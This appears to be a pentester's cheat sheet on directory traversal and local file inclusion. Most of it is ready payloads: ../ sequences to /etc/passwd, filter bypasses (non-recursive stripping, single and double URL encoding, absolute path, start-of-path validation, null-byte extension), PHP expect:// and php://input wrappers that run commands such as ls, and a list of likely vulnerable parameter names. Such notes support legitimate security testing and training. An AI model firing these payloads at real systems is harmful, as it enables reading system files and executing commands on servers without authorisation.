**Directory Traversal**
  Only give us ability to read the resources from the target. 

```python
<=======================================================================================================>
https://medium.com/@Aptive/local-file-inclusion-lfi-web-application-penetration-testing-cc9dc8dd3601

LFI 
  Load and Execute the application 
Image file LFI
GET /image?filename=31.jpg
GET /image?filename=../../../etc/passwd

File path traversal, traversal sequences blocked with absolute path bypass
/etc/passwd

File path traversal, traversal sequences stripped non-recursively
....//....//....//etc/passwd

File path traversal, traversal sequences stripped with superfluous URL-decode
Single URL-Encoding
..%2f..%2f..%2fetc/passwd
Double URL-Encoding [ write 25 in between % and 2 ]
..%252f..%252f..%252fetc/passwd

File path traversal, validation of start of path
/var/www/images/../../../etc/passwd

File path traversal, validation of file extension with null byte bypass
The application validates that the supplied filename ends with the expected file extension.
../../../etc/passwd%00.png ---> Ex. of NULL Character

<=======================================================================================================>
PHP Wrappers
PHP has a number of wrappers that can often be abused to bypass various input filters.
PHP Expect Wrapper
PHP expect:// allows execution of system commands, unfortunately the expect PHP module is not enabled by default.
php?page=expect://ls

The payload is sent in a POST request to the server such as:
/fi/?page=php://input&cmd=ls

/script.php?page=index.html
/script.php?page=../../../../../../../../etc/passwd
```

```css
cat     dir     action      details     file      download      path      folder
include     page      show      doc     view      content     document      mod
conf

where can find LFI --> cookie value && post request 
```

```perl
Bypass Mechanism

NULL Character
DOT Truncation
ENCODING
```
